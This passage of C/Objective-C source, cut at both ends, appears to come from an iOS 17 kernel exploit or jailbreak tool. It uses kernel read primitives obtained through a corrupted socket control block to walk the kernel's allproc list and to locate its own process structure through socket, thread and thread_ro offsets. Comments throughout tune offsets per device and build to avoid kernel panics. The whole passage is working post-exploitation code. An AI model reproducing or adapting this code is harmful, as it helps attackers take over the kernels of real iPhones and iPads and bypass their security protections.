    for (size_t i = 0; i < pid_probe_count; i++) {
        if (validate_proc_chain_with_pid_off(firstproc, 0x00, pid_probe_offs[i], 64)) {
            bsd_chain_ok = true;
            break;
        }
    }

    if (!bsd_chain_ok) {
        /* Bug #424: On iOS 17.3.1 (xnu-10002) allproc uses SMRQ — proc0[+0x08]
         * coincidentally equals allproc_addr because it is the le_prev field of
         * an adjacent 11-element sublist (NOT the real allproc TAILQ backlink).
         * disc_pl phase2 correctly identifies list_off=0xb0 with score≥40 as the
         * real allproc list.  Before rejecting as a mixed head, verify whether
         * the CHOSEN list_off chain itself validates to full depth (200 steps).
         * If it does, the BSD shape at +0x00/+0x08 is coincidental — accept. */
        if (validate_proc_chain_with_pid_off(firstproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, 200)) {
            filelog_write("[val_ap] Bug #424: chosen list_off=0x%x validates full chain "
                          "(BSD shape at proc0=0x%llx +0x00/+0x08 is coincidental sublist) — accepting",
                          PROC_LIST_OFFSET, firstproc);
            return false;
        }
        filelog_write("[val_ap] Bug #390: rejecting mixed head 0x%llx — "
                      "disc_pl chose list_off=0x%x, but proc0 has BSD head "
                      "signature (p_list prev=head next=0x%llx) while chosen "
                      "entry prev=0x%llx is non-kptr",
                      allproc_addr, PROC_LIST_OFFSET, bsd_next, chosen_prev);
        return true;
    }

    return false;
}

/* Bug #233: ipsw_analysis confirms p_pid is at +0x60 for iOS 17.x (xnu-10002).
 * +0x10 is p_pptr (parent proc pointer, 8 bytes) — kread32 reads low-32 of pointer
 *   which can be 0 for kernel_task or small values → false positive in scoring.
 * +0x28 is p_pgrpid (process group ID) — also misleading.
 * Only use 0x60 as PID offset candidate. */
static size_t build_pid_offset_candidates(uint32_t *out, size_t cap) {
    if (cap < 1) return 0;
    /* Bug #449: upstream confirms off_proc_p_pid = 0x60 for iOS 17.x/18.x/26.x.
     * Primary is always current PROC_PID_OFFSET (default now 0x60). Alt is 0xd8
     * as a historic fallback (was incorrectly believed to be iOS 17 default). */
    out[0] = PROC_PID_OFFSET;
    if (cap < 2) return 1;
    uint32_t alt = (PROC_PID_OFFSET == 0x60) ? 0xd8 : 0x60;
    out[1] = alt;
    return 2;
}

static bool read_proc_pid_checked(uint64_t proc, uint32_t pid_off, uint32_t *pid_out) {
    uint32_t pid = 0;
    if (!kread32_checked_local(proc + pid_off, &pid)) return false;
    if (pid_out) *pid_out = pid;
    return true;
}

/* Bug #452: proc-scope guard blocks non-8-byte-aligned zone reads. Some
 * fallback PID scans intentionally probe 32-bit fields every 4 bytes, so a
 * direct ds_kread32_checked(addr) on addr%8==4 trips the misalignment guard
 * before the scan can test promising offsets. Read the containing aligned
 * qword and extract the correct 32-bit half instead. */
static bool read_u32_aligned_checked(uint64_t addr, uint32_t *out) {
    if (!out) return false;
    if ((addr & 3ULL) != 0) return false;
    if ((addr & 7ULL) == 0) {
        return ds_kread32_checked(addr, out);
    }

    uint64_t aligned = addr & ~7ULL;
    uint64_t qw = 0;
    if (!ds_kread64_checked(aligned, &qw)) return false;
    *out = (addr & 4ULL) ? (uint32_t)(qw >> 32) : (uint32_t)qw;
    return true;
}

static uint64_t walk_proc_chain_for_pid(uint64_t start_proc, uint64_t allproc_addr,
                                        uint32_t list_off, uint32_t next_off,
                                        uint32_t pid_off, pid_t target_pid,
                                        int max_steps, uint32_t *max_pid_out,
                                        int *steps_out) {
    uint64_t cur = start_proc;
    uint64_t visited[256];
    int nvisited = 0;
    uint32_t max_pid_seen = 0;
    int steps = 0;

    while (cur != 0 && steps < max_steps) {
        bool ptr_ok = is_proc_chain_ptr(cur);
        if (!ptr_ok) break;

        for (int i = 0; i < nvisited; i++) {
            if (visited[i] == cur) goto walk_done;
        }
        if (nvisited < 256) visited[nvisited++] = cur;

        uint32_t pid = 0;
        if (!read_proc_pid_checked(cur, pid_off, &pid)) break;
        if (!is_plausible_pid(pid) && !(pid == 0 && steps == 0 && is_kernel_data_ptr(cur))) break;
        if (pid > max_pid_seen) max_pid_seen = pid;
        if (pid == (uint32_t)target_pid) {
            if (max_pid_out) *max_pid_out = max_pid_seen;
            if (steps_out) *steps_out = steps + 1;
            return cur;
        }

        uint64_t next_raw = 0;
        if (!ds_kread64_checked(cur + list_off + next_off, &next_raw)) break;
        uint64_t next = 0;
        if (!proc_list_next_checked_pid(cur, list_off, pid_off, &next)) break;
        if (pac_strip(next_raw) == allproc_addr) break;
        if (!next || next == cur) break;

        bool next_ok = is_proc_chain_ptr(next);
        if (!next_ok) break;
        cur = next;
        steps++;
    }

walk_done:
    if (max_pid_out) *max_pid_out = max_pid_seen;
    if (steps_out) *steps_out = steps;
    return 0;
}

/* Bug #231/#235: Score a proc chain by UNIQUE, plausible PIDs, not merely by
 * hop count. Session 22 showed false positives scoring 1002 because a wrong
 * sublist hit pid 1 once and then looped over a tiny PID set. */
static int score_proc_chain_ex(uint64_t firstproc, uint32_t list_off,
                               uint32_t pid_off, uint32_t next_field_off,
                               int max_steps) {
    int seen = 0;
    int unique_pids = 0;
    int zero_pid_count = 0;
    uint64_t cur = firstproc;
    /* Bug #233: cycle detection — track visited proc addresses.
     * A circular sublist (e.g., pgrp or session list) can cycle through
     * the same N procs forever, giving a false high score.
     * Track up to 64 visited addresses; if we revisit one, stop. */
    uint64_t visited[64];
    int nvisited = 0;
    uint32_t pid_seen[64];
    int npid_seen = 0;
    for (int i = 0; i < max_steps && is_proc_chain_ptr(cur); i++) {
        /* Check for cycle */
        for (int v = 0; v < nvisited; v++) {
            if (visited[v] == cur) goto chain_done;  /* cycle detected */
        }
        if (nvisited < 64) visited[nvisited++] = cur;
        uint32_t pid = 0;
        if (!kread32_checked_local(cur + pid_off, &pid)) break;
        if (!is_plausible_pid(pid)) break;
        if (pid == 0) zero_pid_count++;
        bool seen_before = false;
        for (int p = 0; p < npid_seen; p++) {
            if (pid_seen[p] == pid) {
                seen_before = true;
                break;
            }
        }
        if (!seen_before) {
            if (npid_seen < 64) pid_seen[npid_seen++] = pid;
            unique_pids++;
        }
        seen++;
        uint64_t raw_next = 0;
        if (!kread64_checked_local(cur + list_off + next_field_off, &raw_next)) break;
        uint64_t next = normalize_proc_link_target_with_pid(raw_next, list_off, pid_off);
        if (!next) next = fallback_proc_link_target(raw_next);
        if (!is_proc_chain_ptr(next) || next == cur || next == 0) break;
        cur = next;
    }
    chain_done:
    /* Penalize lists dominated by pid 0 repeats. Real allproc has high PID
     * diversity; wrong kernel lists often oscillate among pid 0/5/9 only. */
    return (zero_pid_count > 2) ? unique_pids / 2 : unique_pids;
}

static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firstproc) {
    uint64_t raw = pac_strip(firstproc_raw);
    bool loud = g_validate_curated || (g_validate_verbose_count < 3);
    g_last_disc_pl_score = 0;
    if (loud) {
        uint64_t zmin = ds_get_zone_map_min();
        uint64_t zmax = ds_get_zone_map_max();
        filelog_write("[disc_pl] entry: raw=0x%llx pac_stripped=0x%llx zone=[0x%llx,0x%llx) heap=%d relaxed=%d",
                      firstproc_raw, raw, zmin, zmax, (int)is_heap_ptr(raw), (int)is_heap_ptr_relaxed(raw));
    }
    if (!is_heap_ptr_relaxed(raw)) return false;

    /* Bug #231 diagnostic: read BOTH raw+0 and raw+8 to see what the first
     * two qwords of the candidate proc look like. One of these should be
     * tqe_next (a heap pointer to the next proc); the other may be tqe_prev
     * (a pointer to the previous element's tqe_next field) or some other
     * proc field.  Logging both lets us diagnose LIST_ENTRY field order. */
    if (loud) {
        uint32_t pid0_diag = 0;
        bool pid0_ok = kread32_checked_local(raw + PROC_PID_OFFSET, &pid0_diag);
        uint64_t qw0 = 0, qw8 = 0;
        bool qw0_ok = kread64_checked_local(raw, &qw0);
        bool qw8_ok = kread64_checked_local(raw + 0x08, &qw8);
        filelog_write("[disc_pl] diag: pid=0x%x(ok=%d) [raw+0x00]=0x%llx(ok=%d,heap=%d) [raw+0x08]=0x%llx(ok=%d,heap=%d)",
                      pid0_diag, (int)pid0_ok,
                      qw0, (int)qw0_ok, (int)is_heap_ptr_relaxed(pac_strip(qw0)),
                      qw8, (int)qw8_ok, (int)is_heap_ptr_relaxed(pac_strip(qw8)));
    }

    uint32_t pid_offsets[4] = {0};
    size_t pid_offset_count = build_pid_offset_candidates(pid_offsets, 4);

    /* Bug #231: The old algorithm used a fixed PROC_NEXT_OFFSET, which meant
     * the first-hop next pointer was always read from raw + NEXT_OFFSET,
     * regardless of list_off.  This masked wrong list_off values and could
     * lead to false positives in the chain validation.
     *
     * New algorithm: try both possible next-field positions within the
     * LIST_ENTRY / TAILQ_ENTRY (offset 0x00 = standard le_next first, and
     * 0x08 = reversed / le_prev first).  For each (next_ff, list_off,
     * pid_off) triple, SCORE the chain by length.  The correct triple will
     * yield a chain of hundreds of procs; wrong triples yield <=10.
     * Pick the best-scoring triple. */

    int best_score = 0;
    int required_score = 20;
    uint32_t best_off = 0, best_pid_off = 0, best_next_ff = 0x00;
    uint64_t best_base = 0, best_next_val = 0;
    uint32_t best_nextpid = 0;

    for (uint32_t next_ff = 0; next_ff <= 0x08; next_ff += 0x08) {
        for (uint32_t off = 0; off <= 0x180; off += 0x08) {
            if (raw < off) continue;

            uint64_t base = raw - off;
            if (!is_heap_ptr_relaxed(base)) continue;

            for (size_t pi = 0; pi < pid_offset_count; pi++) {
                uint32_t pid_off = pid_offsets[pi];

                /* Read next using candidate next_ff (not the global) */
                uint64_t raw_next = 0;
                if (!kread64_checked_local(base + off + next_ff, &raw_next)) continue;
                uint64_t next = normalize_proc_link_target_with_pid(raw_next, off, pid_off);
                if (!next) next = fallback_proc_link_target(raw_next);
                if (!is_proc_chain_ptr(next) || next == base) continue;

                /* Bug #232: Do NOT require first proc to have pid==0.
                 * allproc is LIST_HEAD with LIST_INSERT_HEAD — the head
                 * is the NEWEST process, not kernel_task (pid 0).
                 * Just check that the first proc has a plausible pid. */
                uint32_t pid = 0;
                if (!read_proc_pid_checked(base, pid_off, &pid)) continue;
                if (!is_plausible_pid(pid)) continue;

                uint32_t nextpid = 0;
                if (!read_proc_pid_checked(next, pid_off, &nextpid)) continue;
                if (!is_plausible_pid(nextpid)) continue;

                /* Score this candidate by unique plausible PIDs (up to 50 steps). */
                int score = score_proc_chain_ex(base, off, pid_off, next_ff, 50);

                if (loud && score > 2) {
                    filelog_write("[disc_pl] scored: nxff=0x%x off=0x%x poff=0x%x base=0x%llx next=0x%llx npid=%u score=%d",
                                  next_ff, off, pid_off, base, next, nextpid, score);
                }

                if (score > best_score) {
                    best_score = score;
                    best_off = off;
                    best_pid_off = pid_off;
                    best_next_ff = next_ff;
                    best_base = base;
                    best_next_val = next;
                    best_nextpid = nextpid;
                    /* Bug #235: early exit only for genuinely strong PID diversity. */
                    if (best_score >= 40) goto discover_done;
                }
            }
        }
    }

    /* Bug #240: Phase 2 — treat raw as proc base.
     *
     * Phase 1 conflates "offset of raw within proc struct" with "list
     * linkage offset within proc struct".  When allproc->lh_first points
     * to the proc struct base (which is the standard case), Phase 1 can
     * only discover list entries at offset 0.  Session 25c proved that
     * allproc is valid (heap head, pid=0) yet Phase 1 scored only 2
     * because it could not probe list entry at +0xa8.
     *
     * Phase 2 keeps base = raw (the proc base) and iterates list_off
     * independently to find the real list linkage offset.
     *
     * Bug #448: Phase 2 previously started from list_off=0x08, skipping 0x00.
     * On iOS 17.3.1 A12Z the real allproc p_list is a BSD TAILQ at list_off=0x00
     * (confirmed by le_prev = &allproc.tqh_first at proc+0x08). Phase 2 scored
     * list_off=0xb0 (a different list) at 50 because it had a longer run of
     * monotonically-decreasing pids, while list_off=0x00 was never attempted.
     * Starting from 0x00 lets Phase 2 find the REAL allproc chain first. */
    if (best_score < 20) {
        for (uint32_t next_ff = 0; next_ff <= 0x08; next_ff += 0x08) {
            for (uint32_t list_off = 0x00; list_off <= 0x180; list_off += 0x08) {
                for (size_t pi = 0; pi < pid_offset_count; pi++) {
                    uint32_t pid_off = pid_offsets[pi];

                    uint64_t raw_next = 0;
                    if (!kread64_checked_local(raw + list_off + next_ff, &raw_next)) continue;
                    uint64_t next = normalize_proc_link_target_with_pid(raw_next, list_off, pid_off);
                    if (!next) next = fallback_proc_link_target(raw_next);
                    if (!is_proc_chain_ptr(next) || next == raw) continue;

                    uint32_t pid = 0;
                    if (!read_proc_pid_checked(raw, pid_off, &pid)) continue;
                    if (!is_plausible_pid(pid)) continue;

                    uint32_t nextpid = 0;
                    if (!read_proc_pid_checked(next, pid_off, &nextpid)) continue;
                    if (!is_plausible_pid(nextpid)) continue;

                    int score = score_proc_chain_ex(raw, list_off, pid_off, next_ff, 50);
                    if (loud && score > 2) {
                        filelog_write("[disc_pl] phase2: nxff=0x%x loff=0x%x poff=0x%x next=0x%llx npid=%u score=%d",
                                      next_ff, list_off, pid_off, next, nextpid, score);
                    }

                    if (score > best_score) {
                        best_score = score;
                        best_off = list_off;
                        best_pid_off = pid_off;
                        best_next_ff = next_ff;
                        best_base = raw;
                        best_next_val = next;
                        best_nextpid = nextpid;
                        if (best_score >= 40) goto discover_done;
                    }
                }
            }
        }
    }

    discover_done:

    /* Bug #235: accept only if we saw strong PID diversity.
     * Session 22 false positives scored 21/22 with mostly pid 0/5/9, so the
     * validator above was strengthened and the acceptance threshold remains 20
     * on the new unique-PID scale.
     *
     * Bug #378: if layout discovery only succeeds with the alternate PID offset
     * (e.g. 0x60 on 17.3.1 when the runtime default is still 0xd8), commit that
     * offset together with the list geometry. Otherwise the follow-up
     * validate_proc_chain()/ourproc() walk reuses the stale global PID offset,
     * mis-decodes the freshly found chain, and can fault before kernprocaddress()
     * even returns. */
    {
        /* Bug #400 tightened by Bug #430: weak near-rw_pcb candidates with
         * single-digit scores can still be false zone heads that only fail
         * after deeper full-chain probing. Session 25d produced a repeatable
         * false head at 0xffffffe4559f6000 with score=9 that later escalated
         * into a per-cpu zone panic. Keep the near-rw_pcb relaxation, but
         * require a materially stronger score before entering deep validation. */
        const uint64_t PROC_NEAR_PCB_WEAK_SCORE_DIFF = 0xC0000000ULL; /* 3 GB */
        const int PROC_NEAR_PCB_MIN_SCORE = 12;
        uint64_t rw_pcb = ds_get_rw_socket_pcb();
        if (rw_pcb && best_base && is_heap_ptr_relaxed(best_base) && best_score >= PROC_NEAR_PCB_MIN_SCORE) {
            uint64_t diff = (best_base > rw_pcb) ? (best_base - rw_pcb) : (rw_pcb - best_base);
            if (diff <= PROC_NEAR_PCB_WEAK_SCORE_DIFF) {
                required_score = PROC_NEAR_PCB_MIN_SCORE;
                if (loud) {
                    filelog_write("[disc_pl] Bug #400: near-rw_pcb weak-score path enabled "
                                  "(base=0x%llx rw_pcb=0x%llx diff=0x%llx score=%d min=%d)",
                                  best_base, rw_pcb, diff, best_score, required_score);
                }
            }
        }
    }

    if (best_score >= required_score) {
        bool full_chain_ok = validate_proc_chain_with_pid_off(best_base, best_off,
                                                              best_pid_off, 200);
        if (!full_chain_ok) {
            if (loud) {
                filelog_write("[disc_pl] REJECT: score=%d but full chain validation failed "
                              "(base=0x%llx list_off=0x%x pid_off=0x%x nxff=0x%x)",
                              best_score, best_base, best_off, best_pid_off, best_next_ff);
            }
            return false;
        }

        uint32_t old_pid_off = PROC_PID_OFFSET;
        PROC_LIST_OFFSET = best_off;
        PROC_NEXT_OFFSET = best_next_ff;
        PROC_PREV_OFFSET = (best_next_ff == 0x00) ? 0x08 : 0x00;
        PROC_PID_OFFSET = best_pid_off;
        g_last_disc_pl_score = best_score;
        if (out_firstproc) *out_firstproc = best_base;
        filelog_write("[allproc] proc list layout: raw=0x%llx base=0x%llx list_off=0x%x pid_off=0x%x next_ff=0x%x prev_ff=0x%x next=0x%llx nextpid=%u score=%d -> FOUND!",
                      raw, best_base, best_off, best_pid_off, best_next_ff, PROC_PREV_OFFSET,
                      best_next_val, best_nextpid, best_score);
        if (old_pid_off != best_pid_off) {
            filelog_write("[allproc] proc list layout: switching PID offset 0x%x -> 0x%x for validated candidate",
                          old_pid_off, best_pid_off);
        }
        return true;
    }

    /* Fallback diagnostics */
    if (loud) {
        uint64_t tqh_last = 0;
        bool tqh_last_ok = kread64_checked_local(firstproc_raw + 8, &tqh_last);
        filelog_write("[disc_pl] NO MATCH: tqh_last=0x%llx(ok=%d) best_score=%d best_nxff=0x%x best_off=0x%x",
                      tqh_last, (int)tqh_last_ok, best_score, best_next_ff, best_off);
    }

    return false;
}

static NSString *const kkernprocoffset = @"lara.kernproc_offset";

static bool validate_allproc(uint64_t allproc_addr);
static bool detect_kernproc_variable(uint64_t candidate);

/* is_kptr: returns true for valid kernel pointer (after PAC stripping) */
static bool is_kptr(uint64_t p) {
    if (p == 0) return false;
    uint64_t stripped = pac_strip(p);
    return (stripped & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

/* Bug #310: stage head-link validation reads.
 * After Bug #309 removed the old `(head-0xb0)+pid_off` panic, the next
 * panic moved to `head + 0x8` for fake heads already rejectable from qword[0]
 * alone. Read `head+0x08` only when `head+0x00` is zero and we genuinely
 * need a second chance to classify a plausible tail / alternate-list shape. */
static bool staged_head_has_heap_link(uint64_t head, uint64_t *q0_out, bool *q0_ok_out,
                                      uint64_t *q8_out, bool *q8_ok_out) {
    uint64_t q0 = 0, q8 = 0;
    bool q0_ok = kread64_checked_local(head, &q0);
    bool q8_ok = false;
    bool ok = q0_ok && q0 && is_heap_ptr_relaxed(pac_strip(q0));

    if (!ok && q0_ok && q0 == 0) {
        q8_ok = kread64_checked_local(head + 0x08, &q8);
        ok = q8_ok && q8 && is_heap_ptr_relaxed(pac_strip(q8));
    }

    if (q0_out) *q0_out = q0;
    if (q0_ok_out) *q0_ok_out = q0_ok;
    if (q8_out) *q8_out = q8;
    if (q8_ok_out) *q8_ok_out = q8_ok;
    return ok;
}

static bool staged_head_has_kptr_link(uint64_t head, uint64_t *q0_out, bool *q0_ok_out,
                                      uint64_t *q8_out, bool *q8_ok_out) {
    uint64_t q0 = 0, q8 = 0;
    bool q0_ok = kread64_checked_local(head, &q0);
    bool q8_ok = false;
    bool ok = q0_ok && q0 && is_kptr(pac_strip(q0));

    if (!ok && q0_ok && q0 == 0) {
        q8_ok = kread64_checked_local(head + 0x08, &q8);
        ok = q8_ok && q8 && is_kptr(pac_strip(q8));
    }

    if (q0_out) *q0_out = q0;
    if (q0_ok_out) *q0_ok_out = q0_ok;
    if (q8_out) *q8_out = q8;
    if (q8_ok_out) *q8_ok_out = q8_ok;
    return ok;
}

static inline bool is_kernel_data_ptr(uint64_t p) {
    uint64_t stripped = pac_strip(p);
    uint64_t kbase = ds_get_kernel_base();
    if (!kbase) return false;
    return is_kptr(stripped) && stripped >= kbase && stripped < kbase + 0x4000000ULL;
}

static uint64_t find_self_proc_via_socket_tro(void) {
    const uint32_t pcb_socket_offs[] = { 0x40, 0x38, 0x30, 0x48, 0x50, 0x28 };
    /* Bug #449: upstream offsets.m confirms:
     *   off_socket_so_background_thread = 0x298 for iOS 17.0-17.3.x (our target 17.3.1)
     *   off_socket_so_background_thread = 0x2b0 for iOS 17.4+, 18.x
     * 0x298 added first so iPad8,9/17.3.1 hits on the first candidate. */
    const uint32_t socket_bg_thread_known_offs[] = { 0x298, 0x2b0, 0x2a8, 0x2b8, 0x2c0, 0x2a0 };
    const uint32_t socket_bg_thread_scan_start = 0x240;
    const uint32_t socket_bg_thread_scan_end = 0x320;
    const uint32_t socket_bg_thread_scan_step = 0x8;
    /* Bug #449: upstream offsets.m confirms:
     *   off_thread_t_tro = 0x358 for A12/A12Z, iOS 17.0-17.3.x (iPad8,9 target)
     *   off_thread_t_tro = 0x368 for A13+, iOS 17.0-17.3.x
     *   off_thread_t_tro = 0x370/0x380 for A13+, iOS 17.4+
     * 0x358 added first so A12Z on 17.3.1 hits the correct offset immediately. */
    const uint32_t thread_tro_known_offs[] = { 0x358, 0x368, 0x370, 0x360, 0x378 };
    const uint32_t thread_tro_scan_start = 0x300;
    const uint32_t thread_tro_scan_end = 0x3f0;
    const uint32_t thread_tro_scan_step = 0x8;
    /* Bug #444: tro_proc/tro_task offsets differ by iOS version.
     * iOS 17.0-17.3: tro_proc=0x10, tro_task=0x20
     * iOS 17.4+    : tro_proc=0x18, tro_task=0x28
     * Scan both pairs so the correct version is found automatically. */
    const uint32_t tro_proc_candidate_offs[] = { 0x10, 0x18 };
    const uint32_t tro_task_candidate_offs[] = { 0x20, 0x28 };
    const size_t n_tro_proc_cands = sizeof(tro_proc_candidate_offs)/sizeof(tro_proc_candidate_offs[0]);
    uint32_t socket_bg_thread_offs[32] = {0};
    uint32_t thread_tro_offs[32] = {0};
    size_t nbg = 0;
    size_t ntro = 0;

    char build[32] = {0};
    bool have_build = get_os_build(build, sizeof(build));
    bool use_exact_upstream_21d61 = have_build && strcmp(build, "21D61") == 0;

    if (use_exact_upstream_21d61) {
        /* Keep 21D61 on a tiny exact-set instead of a broad scan.
         * Start with upstream-confirmed iOS 17.1-17.3 A12 values, but also try
         * the adjacent pair preserved from prior tests:
         *   primary: bg=0x2a8 tro=0x368
         *   alt:     bg=0x298 tro=0x358
         * plus one nearby fallback each to tolerate minor drift without opening
         * the old huge scan window that used to trip proc-scope guard. */
        socket_bg_thread_offs[nbg++] = 0x2a8;
        socket_bg_thread_offs[nbg++] = 0x298;
        socket_bg_thread_offs[nbg++] = 0x2b0;
        thread_tro_offs[ntro++] = 0x368;
        thread_tro_offs[ntro++] = 0x358;
        thread_tro_offs[ntro++] = 0x370;
        /* Bug #455: the strict 3x3 exact set still misses on fresh 21D61 logs:
         * we get a usable socket and one non-zero background-thread pointer, but
         * the guessed t_tro offsets can still be off by a single nearby slot.
         * Stay 21D61-local, but widen only to the immediate neighborhoods around
         * the confirmed upstream values rather than dropping straight to the old
         * full sweep. This keeps the fast path targeted and much safer than the
         * later allproc seed scan that is currently panicking in phase 4. */
        for (uint32_t off = 0x288; off <= 0x2c0; off += 0x8) {
            bool seen = false;
            for (size_t i = 0; i < nbg; i++) {
                if (socket_bg_thread_offs[i] == off) {
                    seen = true;
                    break;
                }
            }
            if (!seen && nbg < sizeof(socket_bg_thread_offs)/sizeof(socket_bg_thread_offs[0])) {
                socket_bg_thread_offs[nbg++] = off;
            }
        }
        for (uint32_t off = 0x340; off <= 0x380; off += 0x8) {
            bool seen = false;
            for (size_t i = 0; i < ntro; i++) {
                if (thread_tro_offs[i] == off) {
                    seen = true;
                    break;
                }
            }
            if (!seen && ntro < sizeof(thread_tro_offs)/sizeof(thread_tro_offs[0])) {
                thread_tro_offs[ntro++] = off;
            }
        }
        filelog_write("[ourproc] socket/tro fast path: using exact+nearby 21D61 set (bg≈0x298/0x2a8/0x2b0 tro≈0x358/0x368/0x370 tro_proc=0x10|0x18 tro_task=0x20|0x28)");
    } else {
        for (size_t i = 0; i < sizeof(socket_bg_thread_known_offs)/sizeof(socket_bg_thread_known_offs[0]); i++) {
            socket_bg_thread_offs[nbg++] = socket_bg_thread_known_offs[i];
        }
        for (uint32_t off = socket_bg_thread_scan_start; off <= socket_bg_thread_scan_end; off += socket_bg_thread_scan_step) {
            bool seen = false;
            for (size_t i = 0; i < nbg; i++) {
                if (socket_bg_thread_offs[i] == off) {
                    seen = true;
                    break;
                }
            }
            if (!seen && nbg < sizeof(socket_bg_thread_offs)/sizeof(socket_bg_thread_offs[0])) {
                socket_bg_thread_offs[nbg++] = off;
            }
        }
        for (size_t i = 0; i < sizeof(thread_tro_known_offs)/sizeof(thread_tro_known_offs[0]); i++) {
            thread_tro_offs[ntro++] = thread_tro_known_offs[i];
        }
        for (uint32_t off = thread_tro_scan_start; off <= thread_tro_scan_end; off += thread_tro_scan_step) {
            bool seen = false;
            for (size_t i = 0; i < ntro; i++) {
                if (thread_tro_offs[i] == off) {
                    seen = true;
                    break;
                }
            }
            if (!seen && ntro < sizeof(thread_tro_offs)/sizeof(thread_tro_offs[0])) {
                thread_tro_offs[ntro++] = off;
            }
        }
    }

    uint64_t rw_pcb = ds_get_rw_socket_pcb();
    bool rw_pcb_ok = rw_pcb && (is_heap_ptr_relaxed(rw_pcb) || is_in_zone_map(rw_pcb) || is_kptr(rw_pcb));
    if (!rw_pcb_ok) {
        filelog_write("[ourproc] socket/tro fast path: rw_socket_pcb unavailable (0x%llx)", rw_pcb);
        return 0;
    }

    int socket_read_failures = 0;
    int socket_ptr_rejects = 0;
    uint64_t last_socket_raw_reject = 0;
    uint64_t last_socket_reject = 0;
    uint64_t socket = 0;
    uint32_t chosen_pcb_socket_off = 0;

    for (size_t si = 0; si < sizeof(pcb_socket_offs)/sizeof(pcb_socket_offs[0]); si++) {
        uint32_t pcb_socket_offset = pcb_socket_offs[si];
        uint64_t socket_raw = 0;
        if (!ds_kread64_checked(rw_pcb + pcb_socket_offset, &socket_raw)) {
            socket_read_failures++;
            continue;
        }

        uint64_t socket_candidate = pac_strip(socket_raw);
        bool socket_ok = is_heap_ptr_relaxed(socket_candidate) || is_in_zone_map(socket_candidate) || is_kptr(socket_candidate);
        if (!socket_ok) {
            socket_ptr_rejects++;
            last_socket_raw_reject = socket_raw;
            last_socket_reject = socket_candidate;
            continue;
        }

        bool saw_nonzero_thread = false;
        bool all_nonzero_thread_tiny = true;
        bool has_thread_like = false;
        for (size_t bi = 0; bi < nbg; bi++) {
            uint64_t thread_raw_probe = 0;
            if (!ds_kread64_checked(socket_candidate + socket_bg_thread_offs[bi], &thread_raw_probe)) {
                continue;
            }
            uint64_t thread_probe = pac_strip(thread_raw_probe);
            if (thread_probe == 0) {
                continue;
            }
            saw_nonzero_thread = true;
            if (thread_probe >= 0x100000000ULL) {
                all_nonzero_thread_tiny = false;
            }
            if (is_heap_ptr_relaxed(thread_probe) || is_in_zone_map(thread_probe) || is_kptr(thread_probe)) {
                has_thread_like = true;
                break;
            }
        }

        if (!has_thread_like && saw_nonzero_thread && all_nonzero_thread_tiny) {
            socket_ptr_rejects++;
            last_socket_raw_reject = socket_raw;
            last_socket_reject = socket_candidate;
            continue;
        }

        socket = socket_candidate;
        chosen_pcb_socket_off = pcb_socket_offset;
        break;
    }

    if (!socket) {
        filelog_write("[ourproc] socket/tro fast path: no usable socket candidate (read_failures=%d ptr_rejects=%d last raw=0x%llx stripped=0x%llx)",
                      socket_read_failures, socket_ptr_rejects, last_socket_raw_reject, last_socket_reject);
        return 0;
    }

    pid_t ourpid = getpid();
    uint32_t pid_candidates[4] = {0};
    size_t npid = build_pid_offset_candidates(pid_candidates, 4);
    int proc_ptr_rejects = 0;
    uint64_t last_proc_raw_reject = 0;
    uint64_t last_proc_reject = 0;
    int thread_ptr_rejects = 0;
    int tro_ptr_rejects = 0;
    int pid_probe_misses = 0;
    int task_proof_misses = 0;
    uint64_t last_thread_raw_reject = 0;
    uint64_t last_thread_reject = 0;
    int thread_read_failures = 0;
    int thread_zero_reads = 0;
    uint32_t last_thread_bg_off = 0;
    int tro_read_failures = 0;
    int tro_zero_reads = 0;
    uint64_t last_tro_raw_reject = 0;
    uint64_t last_tro_reject = 0;
    uint32_t last_tro_off = 0;

    for (size_t bi = 0; bi < nbg; bi++) {
        uint64_t thread_raw = 0;
        if (!ds_kread64_checked(socket + socket_bg_thread_offs[bi], &thread_raw)) {
            thread_read_failures++;
            continue;
        }

        if (thread_raw == 0) {
            thread_zero_reads++;
            last_thread_bg_off = socket_bg_thread_offs[bi];
            continue;
        }

        uint64_t thread = pac_strip(thread_raw);
        bool thread_ok = is_heap_ptr_relaxed(thread) || is_in_zone_map(thread) || is_kptr(thread);
        if (!thread_ok) {
            thread_ptr_rejects++;
            last_thread_raw_reject = thread_raw;
            last_thread_reject = thread;
            last_thread_bg_off = socket_bg_thread_offs[bi];
            continue;
        }

        for (size_t ti = 0; ti < ntro; ti++) {
            uint64_t tro_raw = 0;
            if (!ds_kread64_checked(thread + thread_tro_offs[ti], &tro_raw)) {
                tro_read_failures++;
                continue;
            }

            if (tro_raw == 0) {
                tro_zero_reads++;
                last_tro_off = thread_tro_offs[ti];
                continue;
            }

            uint64_t tro = pac_strip(tro_raw);
            bool tro_ok = is_kptr(tro) || is_in_zone_map(tro) || is_heap_ptr_relaxed(tro);
            if (!tro_ok) {
                tro_ptr_rejects++;
                last_tro_raw_reject = tro_raw;
                last_tro_reject = tro;
                last_tro_off = thread_tro_offs[ti];
                continue;
            }

            for (size_t pc = 0; pc < n_tro_proc_cands; pc++) {
            uint32_t tro_proc_off = tro_proc_candidate_offs[pc];
            uint32_t tro_task_off = tro_task_candidate_offs[pc];
            uint64_t proc_raw = 0, task_raw = 0;
            if (!ds_kread64_checked(tro + tro_proc_off, &proc_raw)) continue;
            (void)ds_kread64_checked(tro + tro_task_off, &task_raw);

            uint64_t proc = pac_strip(proc_raw);
            uint64_t tro_task = pac_strip(task_raw);
            bool proc_ok = is_heap_ptr_relaxed(proc) || is_in_zone_map(proc) || is_kernel_data_ptr(proc);
            bool tro_task_ok = is_kptr(tro_task);
            if (!proc_ok) {
                proc_ptr_rejects++;
                last_proc_raw_reject = proc_raw;
                last_proc_reject = proc;
                continue;
            }

            for (size_t pi = 0; pi < npid; pi++) {
                uint32_t pid = 0;
                uint32_t pid_off = pid_candidates[pi];
                if (!read_proc_pid_checked(proc, pid_off, &pid)) {
                    pid_probe_misses++;
                    continue;
                }
                if (pid != (uint32_t)ourpid) {
                    pid_probe_misses++;
                    continue;
                }

                bool proc_ro_ok = false;
                bool ro_task_ok = false;
                uint64_t proc_ro_raw = 0, proc_ro = 0, ro_task_raw = 0, ro_task = 0;
                if (ds_kread64_checked(proc + O_PROC_RO, &proc_ro_raw)) {
                    proc_ro = pac_strip(proc_ro_raw);
                    proc_ro_ok = is_kptr(proc_ro);
                }
                if (proc_ro_ok && ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &ro_task_raw)) {
